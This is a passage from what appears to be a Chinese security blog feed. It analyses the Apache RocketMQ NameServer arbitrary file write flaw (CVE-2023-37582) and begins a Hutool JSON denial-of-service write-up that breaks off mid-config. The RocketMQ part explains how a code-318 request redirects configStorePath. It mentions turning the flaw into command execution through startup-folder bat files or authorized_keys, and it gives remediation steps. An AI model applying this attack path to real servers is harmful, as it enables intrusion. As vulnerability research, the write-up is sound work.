class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- ä¿å­˜30å¤©çš„æ—¥å¿— --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¾“å‡ºæ—¥å¿—è®°å½•æ ¼å¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- ç¬¬äºŒä¸ªæ–‡ä»¶è¾“å‡º,æ¯å¤©äº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- è®¾ç½®æ—¥å¿—è¾“å‡ºçº§åˆ« --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- è‡ªå®šä¹‰logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¯å¢ƒé…ç½®å®Œæˆåè¿è¡Œä¸»ç±»<code>org.apache.rocketmq.broker.NameSrvStartup</code>å¯åŠ¨<code>ROCKETMQ NameServer</code>ï¼Œæ§åˆ¶å°è¾“å‡ºä»¥ä¸‹å†…å®¹åˆ™<code>NameServer</code>å¯åŠ¨æˆåŠŸ</p>
<p><img src="/archives/968babfb/image-20230724103631325.png" alt="image-20230724103631325"></p>
<p>è¿è¡Œä¸»ç±»<code>org.apache.rocketmq.broker.BrokerStartup</code>å¯åŠ¨<code>ROCKETMQ Broker</code>ï¼Œæ§åˆ¶å°è¾“å‡ºä»¥ä¸‹å†…å®¹åˆ™<code>Broker</code>å¯åŠ¨æˆåŠŸ</p>
<p><img src="/archives/968babfb/image-20230724103711506.png" alt="image-20230724103711506"></p>
<p>æ—¥å¿—ä¸­æç¤ºäº†<code>Broker</code>ç›‘å¬åœ°å€ä¸<code>NameServer</code>åœ°å€ã€‚</p>
<p><strong>é¶åœºæ­å»º</strong></p>
<p>è°ƒè¯•ç¯å¢ƒå¯ç”¨äºæµ‹è¯•PoC</p>
<h3 id="è¯¦æƒ…"><a href="#è¯¦æƒ…" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h3><p>ä¸ºäº†æ›´æ¸…æ™°åœ°äº†è§£è¯¥æ¼æ´ï¼Œæˆ‘ä»¬ä»éœ€äº†è§£<code>NameServer</code>çš„å¯åŠ¨è¿‡ç¨‹ã€‚å¦ä¸€æ–¹é¢ï¼Œè¯¥æ¼æ´æ˜¯é’ˆå¯¹<code>NameServer</code>çš„æ”»å‡»ä¸<code>Broker</code>å…³ç³»ä¸å¤§ï¼Œäº†è§£<code>NameServer</code>çš„å¯åŠ¨è¿‡ç¨‹å°†æ›´æœ‰åŠ©äºæˆ‘ä»¬åˆ†ææ¼æ´ã€‚</p>
<p><img src="/archives/968babfb/image-20230724104157525.png" alt="image-20230724104157525"></p>
<p>åœ¨<code>org.apache.rocketmq.namesrv.NamesrvStartup</code>ç±»ä¸­ï¼Œå¯åŠ¨é˜¶æ®µçš„å…³é”®ä»£ç å‡ºç°åœ¨ç¬¬57ä¸58è¡Œã€‚å¯åŠ¨æ—¶é¦–å…ˆè¦åšçš„æ˜¯åˆ›å»º<code>NameSrvController</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œç„¶åå†æ‰§è¡Œ<code>start</code>æµç¨‹ã€‚</p>
<p>åˆ›å»º<code>Controller</code>è¿‡ç¨‹ä¸­ä¸»è¦è¿›è¡Œäº†å‘½ä»¤è¡Œå‚æ•°è§£æã€é…ç½®æ–‡ä»¶è§£æã€æ—¥å¿—é…ç½®è§£æå¹¶å°†ç›¸å…³çš„é…ç½®æ˜ å°„åˆ°æ³¨å†Œ<code>namesrvConfig</code>ä¸<code>nettyServerConfig</code>ä¸¤ä¸ªå¯¹è±¡ä¸­å¹¶å‘<code>Controller</code>æ³¨å†Œ</p>
<p><img src="/archives/968babfb/image-20230724105127793.png" alt="image-20230724105127793"></p>
<p><code>start</code>å¯åŠ¨è¿‡ç¨‹ä¸­æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>org.apache.rocketmq.remoting.netty.NettyRemotingServer</code>çš„<code>start</code>æ–¹æ³•</p>
<p><img src="/archives/968babfb/image-20230724105757412.png" alt="image-20230724105757412"></p>
<p><img src="/archives/968babfb/image-20230724105828274.png" alt="image-20230724105828274"></p>
<p>è¯¥æ–¹æ³•ä¸»è¦å®Œæˆäº†å„ç±»å¤„ç†å™¨çš„åˆå§‹åŒ–ã€Nettyè§£ç å™¨ä¸æ¶ˆæ¯å¤„ç†å™¨çš„æ³¨å†Œã€ç›‘å¬æœåŠ¡çš„å¯åŠ¨ã€‚</p>
<p>å…¶ä¸­<code>encoder</code>è´Ÿè´£<code>RocketMQ</code>åè®®æ¶ˆæ¯å¤´çš„è§£æä¸æ¶ˆæ¯ä½“çš„æå–ï¼Œæœ€ç»ˆå½¢æˆå­—èŠ‚æµä¼ é€’ç»™<code>serverHandler</code>è¿›è¡Œå¤„ç†ã€‚</p>
<p><img src="/archives/968babfb/image-20230724110057582.png" alt="image-20230724110057582"></p>
<p><code>serverHandler</code>ä¼šæ ¹æ®ä¸åŒçš„æ¶ˆæ¯ç±»å‹é€‰æ‹©ä¸åŒçš„å¤„ç†æ–¹å¼</p>
<p><img src="/archives/968babfb/image-20230724110245393.png" alt="image-20230724110245393"></p>
<p>åœ¨è¿›è¡Œ<code>Request</code>ç±»å‹æ¶ˆæ¯å¤„ç†æ—¶ä¼šå…ˆé€‰æ‹©å¤„ç†å™¨ç±»å‹ï¼Œç„¶åè°ƒç”¨å…¶<code>processRequest</code>æ–¹æ³•è¿›è¡Œå…·ä½“çš„æ¶ˆæ¯å¤„ç†</p>
<p><img src="/archives/968babfb/image-20230724110444420.png" alt="image-20230724110444420"></p>
<p>é»˜è®¤ä½¿ç”¨çš„æ¶ˆæ¯å¤„ç†å™¨ç±»ä¸º<code>org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor</code>ï¼Œå…¶<code>processRequest</code>æ–¹æ³•ä¼šæ ¹æ®è¯·æ±‚ä¸­çš„<code>code</code>å‚æ•°é€‰æ‹©ä¸åŒçš„å¤„ç†æ–¹å¼ã€‚</p>
<p><img src="/archives/968babfb/image-20230724110816397.png" alt="image-20230724110816397"></p>
<p>åœ¨ç›‘å¬æœåŠ¡å¯åŠ¨åï¼Œ<code>netty</code>å°†æŒ‰ç…§æ¯ç§’1æ¬¡çš„é¢‘ç‡ä¸æ–­è·å–ç›‘å¬ç«¯å£ä¿¡æ¯ï¼Œç„¶åä¸€æ¬¡è°ƒç”¨d<code>ecoder</code>ã€<code>handle</code>rå¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œä¸Šé¢å°±æ˜¯<code>Namesrv</code>çš„ç®€å•å¯åŠ¨æµç¨‹ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯å½“<code>org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor#processRequest</code> ç¬¬88è¡Œ<code>request.getCode</code>æ–¹æ³•çš„ç»“æœä¸º<code>318</code>æ—¶åˆ™è¿›å…¥åˆ°é…ç½®æ›´æ–°æµç¨‹</p>
<p><img src="/archives/968babfb/image-20230724111434267.png" alt="image-20230724111434267"></p>
<p>åœ¨<code>updateConfig</code>æ–¹æ³•ä¸­é¦–å…ˆä¼šè·å–è¯·æ±‚ä½“å¯¹è±¡ç„¶åè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºpropertieså¯¹è±¡,æœ€ç»ˆå°†propertiesæ›´æ–°åˆ°configurationå¯¹è±¡ä¸­</p>
<p><img src="/archives/968babfb/image-20230724111817726.png" alt="image-20230724111817726"></p>
<p><code>this.namesrvController.getConfiguration()</code>è·å–åˆ°çš„æ˜¯ä¸€ä¸ªConfigurationå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶<code>update</code>æ–¹æ³•è¿›è¡Œé…ç½®æ›´æ–°</p>
<p><img src="/archives/968babfb/image-20230724112214708.png" alt="image-20230724112214708"></p>
<p><code>org.apache.rocketmq.common.Configuration#update</code>æ–¹æ³•é¦–å…ˆå°†ç”¨æˆ·è¯·æ±‚ä½“çš„é…ç½®ä¿¡æ¯åˆå¹¶åˆ°<code>this.allconfigs</code>ä¸­ï¼Œç„¶åéå†<code>configObjectList</code>å¯¹è±¡æˆå‘˜ï¼Œå†å°†é…ç½®ä¿¡æ¯åˆå¹¶åˆ°å…¶ä¸­ã€‚ä»ä¸Šå›¾æˆ‘ä»¬çŸ¥é“<code>configObjectList</code>åŒ…å«ä¸¤ä¸ªå¯¹è±¡åˆ†åˆ«æ˜¯ç¨‹åºå¯åŠ¨è¿‡ç¨‹ä¸­å¯¹<code>configuration</code>åˆå§‹åŒ–æ—¶ä¼ å…¥çš„<code>NamesrvConfig</code>ä¸<code>NettyServerConfig</code>å¯¹è±¡ã€‚å®Œæˆé…ç½®åœ¨å†…å­˜æ€çš„æ›´æ–°åè°ƒç”¨<code>persist</code>æ–¹æ³•å¯¹é…ç½®è¿›è¡ŒæŒä¹…åŒ–ã€‚</p>
<p><img src="/archives/968babfb/image-20230724112353518.png" alt="image-20230724112353518"></p>
<p><code>persist</code>æ–¹æ³•å®Œæˆäº†åœ¨å†…å­˜ä¸­å®æ—¶çš„é…ç½®ä¿¡æ¯çš„æŒä¹…åŒ–ï¼Œå…¶é¦–å…ˆä¼šè°ƒç”¨<code>getAllConfigsInternal</code>æ–¹æ³•è·å–æ‰€æœ‰é…ç½®ï¼Œç„¶åè°ƒç”¨<code>getStorePath</code>æ–¹æ³•è·å–åˆ°é…ç½®çš„å­˜å‚¨è·¯å¾„ï¼Œæœ€ç»ˆè°ƒç”¨<code>string2File</code>æ–¹æ³•ä»¥å‰ä¸¤ä¸ªè¦ç´ ä¸ºå‚æ•°é…ç½®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ã€‚</p>
<p><img src="/archives/968babfb/image-20230724134008018.png" alt="image-20230724134008018"></p>
<p>ä¸€èˆ¬æ¥è®²ï¼Œä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œä¸€æ˜¯æ–‡ä»¶çš„åç¼€åå¯æ§ï¼ŒäºŒæ˜¯æ–‡ä»¶çš„å†…å®¹å¯æ§ã€‚å¯¹äºè¯¥æ¼æ´æ¥è¯´æˆ‘ä»¬é€šè¿‡<code>getAllConfigsInternal</code>è·å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œé€šè¿‡<code>getStorePath</code>è·å–åˆ°æ–‡ä»¶è·¯å¾„ã€‚é‚£ä¹ˆè¿™ä¸¤è€…æ˜¯å¦å¯æ§å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥çœ‹<code>getAllConfigsInternal</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼Œä¸€æ˜¯éå†<code>configObjectList</code>å¯¹è±¡ç„¶åå°†å…¶æˆå‘˜è½¬æ¢ä¸º<code>properties</code>å¯¹è±¡ï¼ŒäºŒæ˜¯å°†<code>properties</code>å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚ä»å‰é¢æˆ‘ä»¬çŸ¥é“<code>configObjectList</code>å¯¹è±¡å¯ä»¥è¢«ç”¨æˆ·é€šè¿‡<code>code</code>ä¸º<code>318</code>çš„è¯·æ±‚ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶å†…å®¹æ˜¯å¯æ§çš„ã€‚</p>
<p><img src="/archives/968babfb/image-20230724134512621.png" alt="image-20230724134512621"></p>
<p>å†çœ‹<code>getStorePath</code>æ–¹æ³•ï¼Œåœ¨ç¬¬<code>156</code>è¡Œæœ‰å¾ˆæ˜æ˜¾çš„åå°„è°ƒç”¨ï¼Œè·å–çš„å€¼æ˜¯<code>NamesrvConfig</code>å¯¹è±¡ä¸­<code>configStorePath</code>å­—æ®µçš„å€¼ã€‚</p>
<p><img src="/archives/968babfb/image-20230724140738246.png" alt="image-20230724140738246"></p>
<p>åœ¨<code>update</code>æ–¹æ³•ä¸­185è¡Œæˆ‘ä»¬çŸ¥é“ï¼Œç”¨æˆ·è¯·æ±‚ä½“ä¸­çš„é…ç½®ä¼šä¿®æ”¹<code>NamesrvConfig</code>çš„å±æ€§ï¼Œæ•…æŒä¹…åŒ–çš„é…ç½®æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ä¹Ÿæ˜¯å¯å˜çš„ï¼Œäºæ˜¯ä¾¿æ„æˆäº†ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ä¸¤ä¸ªè¦ç´ ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨äº’è”ç½‘æµä¼ çš„PoCå¯¹æ¼æ´è¿›è¡ŒéªŒè¯ï¼Œå› ä¸ºæœ¬æ–‡çš„å¤ç°ç¯å¢ƒä¸ºWindowsæ‰€ä»¥éœ€è¦å¯¹PoCè¿›è¡Œé€‚å½“çš„ä¿®æ”¹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨PoCä¸­ï¼Œç”¨æˆ·å‘é€ç»™<code>NameServer</code>çš„è¯·æ±‚ä½“æ•°æ®ä¸ºä¸¤ä¸ªé€šè¿‡æ¢è¡Œç¬¦åˆ†å‰²çš„é”®å€¼å¯¹ç±»å‹æ•°æ®ï¼Œåˆ†åˆ«ä¸º<code>configStorePath</code>ä¸<code>productEnvName</code>ï¼Œå…¶ä¸­<code>configStorePath</code>è´Ÿè´£æŒ‡å®šé…ç½®æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œ<code>productEnvName</code>åªæ˜¯ç”¨äºéªŒè¯é…ç½®æ˜¯å¦å†™å…¥æˆåŠŸã€‚</p>
<p><img src="/archives/968babfb/image-20230724142757605.png" alt="image-20230724142757605"></p>
<p>æ‰§è¡ŒéªŒè¯è„šæœ¬</p>
<p><img src="/archives/968babfb/image-20230724142220826.png" alt="image-20230724142220826"></p>
<p>åˆ°å¯åŠ¨ç›®å½•æŸ¥çœ‹å‘ç°æ–‡ä»¶å†™å…¥æˆåŠŸ</p>
<p><img src="/archives/968babfb/image-20230724142657752.png" alt="image-20230724142657752"></p>
<p>è‹¥éœ€è¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œåªéœ€è¦å‘å¯åŠ¨ç›®å½•é‡Œå†™å…¥batæ–‡ä»¶å³å¯</p>
<p><img src="/archives/968babfb/image-20230724151317005.png" alt="image-20230724151317005"></p>
<p>æˆ–è€…å‘.sshæ–‡ä»¶å¤¹ä¸‹çš„authorized_keysä¸­å†™å…¥æ–°çš„å…¬é’¥ï¼ˆæœªéªŒè¯ï¼‰</p>
<p>æœ€åæ”¾ä¸Šè°ƒç”¨æ ˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">persist:<span class="number">208</span>, Configuration (org.apache.rocketmq.common)</span><br><span class="line">update:<span class="number">198</span>, Configuration (org.apache.rocketmq.common)</span><br><span class="line">updateConfig:<span class="number">584</span>, DefaultRequestProcessor (org.apache.rocketmq.namesrv.processor)</span><br><span class="line">processRequest:<span class="number">131</span>, DefaultRequestProcessor (org.apache.rocketmq.namesrv.processor)</span><br><span class="line">asyncProcessRequest:<span class="number">26</span>, AsyncNettyRequestProcessor (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:<span class="number">227</span>, NettyRemotingAbstract$<span class="number">1</span> (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:<span class="number">80</span>, RequestTask (org.apache.rocketmq.remoting.netty)</span><br><span class="line">call:<span class="number">511</span>, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run$$$capture:<span class="number">266</span>, FutureTask (java.util.concurrent)</span><br><span class="line">run:-<span class="number">1</span>, FutureTask (java.util.concurrent)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><p>1ã€éå¿…é¡»å‹¿å‘äº’è”ç½‘å¼€æ”¾ä¸å¿…è¦çš„æœåŠ¡ç«¯å£ï¼Œæ§åˆ¶æš´éœ²é¢ï¼›</p>
<p>2ã€å…³é”®æœåŠ¡å¢åŠ ç”¨æˆ·æƒé™æ ¡éªŒï¼›</p>
<p>3ã€å‡çº§è½¯ä»¶åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬æˆ–æœ€æ–°ç‰ˆã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
</ul>
<h2 id="è½¯å®‰è§£å†³æ–¹æ¡ˆ"><a href="#è½¯å®‰è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è½¯å®‰è§£å†³æ–¹æ¡ˆ"></a>è½¯å®‰è§£å†³æ–¹æ¡ˆ</h2>]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>Apache RocketMQ</tag>
        <tag>RCE</tag>
        <tag>è¿œç¨‹ä»£ç æ‰§è¡Œ</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>æ¼æ´</tag>
        <tag>CVE-2023-37582</tag>
      </tags>
  </entry>
  <entry>
    <title>Hutool JSONUtilæ‹’ç»æœåŠ¡æ¼æ´ï¼ˆCVE-2022-45690 CVE-2022-45689ï¼‰</title>
    <url>/archives/3f6576a1.html</url>
    <content><![CDATA[<h1 id="Hutool-JSONUtilæ‹’ç»æœåŠ¡æ¼æ´ï¼ˆCVE-2022-45690-CVE-2022-45689ï¼‰"><a href="#Hutool-JSONUtilæ‹’ç»æœåŠ¡æ¼æ´ï¼ˆCVE-2022-45690-CVE-2022-45689ï¼‰" class="headerlink" title="Hutool JSONUtilæ‹’ç»æœåŠ¡æ¼æ´ï¼ˆCVE-2022-45690 CVE-2022-45689ï¼‰"></a>Hutool JSONUtilæ‹’ç»æœåŠ¡æ¼æ´ï¼ˆCVE-2022-45690 CVE-2022-45689ï¼‰</h1><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p><code>Hutool</code>æ˜¯ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œä¸”æ˜“ç”¨çš„<strong>Javaå·¥å…·åº“</strong>ï¼Œé€šè¿‡è¯¸å¤šå®ç”¨å·¥å…·ç±»çš„ä½¿ç”¨ï¼Œæ—¨åœ¨å¸®åŠ©å¼€å‘è€…å¿«é€Ÿã€ä¾¿æ·åœ°å®Œæˆå„ç±»å¼€å‘ä»»åŠ¡ã€‚ è¿™äº›å°è£…çš„å·¥å…·æ¶µç›–äº†å­—ç¬¦ä¸²ã€æ•°å­—ã€é›†åˆã€ç¼–ç ã€æ—¥æœŸã€æ–‡ä»¶ã€IOã€åŠ å¯†ã€æ•°æ®åº“JDBCã€JSONã€HTTPå®¢æˆ·ç«¯ç­‰ä¸€ç³»åˆ—æ“ä½œï¼Œ å¯ä»¥æ»¡è¶³å„ç§ä¸åŒçš„å¼€å‘éœ€æ±‚ã€‚</p>
<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>CVE-2022-45690ï¼š è¯¥é¡¹ç›®å—å½±å“ç‰ˆæœ¬å­˜åœ¨æ‹’ç»æœåŠ¡æ¼æ´ï¼Œç”±äºorg.json.JSONTokener.nextValue::JSONTokener.javaç»„ä»¶ä¸­å¹¶æœªæ£€éªŒjsonçš„åµŒå¥—æ·±åº¦ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹åˆ¶çš„JSONæˆ–XMLæ•°æ®åœ¨ç¨‹åºè§£ææ—¶å¯¼è‡´JVMæº¢å‡ºä»è€Œå®ç°æ‹’ç»æœåŠ¡(DoS)æ”»å‡»ã€‚</p>
<p>CVE-2022-45689ï¼šè¯¥é¡¹ç›®å—å½±å“ç‰ˆæœ¬å­˜åœ¨æ‹’ç»æœåŠ¡æ¼æ´ï¼Œç”±äºJSONObject.javaä¸­JSONObjectæ–¹æ³•å¯¹äºè¦è§£æçš„jsonå¹¶æœªæ£€éªŒæ˜¯å¦åˆæ³•ï¼Œåœ¨åç»­è§£æJSONæ—¶å°±ä¼šå› ä¸ºå†…å­˜ä¸è¶³è€Œé€ æˆæ‹’ç»æœåŠ¡æ¼æ´ã€‚</p>
<span id="more"></span>

<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><p>&lt; Hutool 5.8.11</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h3><p>ä½¿ç”¨ideaæ–°å»ºåŸºäºmavençš„javaé¡¹ç›®ï¼Œåœ¨pom.xmlä¸­å¼•å…¥<code>hutool</code>åŒ…</p>
<p><img src="/archives/3f6576a1/image-20230811111844774.png" alt="image-20230811111844774"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hutool-all-version</span>&gt;</span>5.7.22<span class="tag">&lt;/<span class="name">hutool-all-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    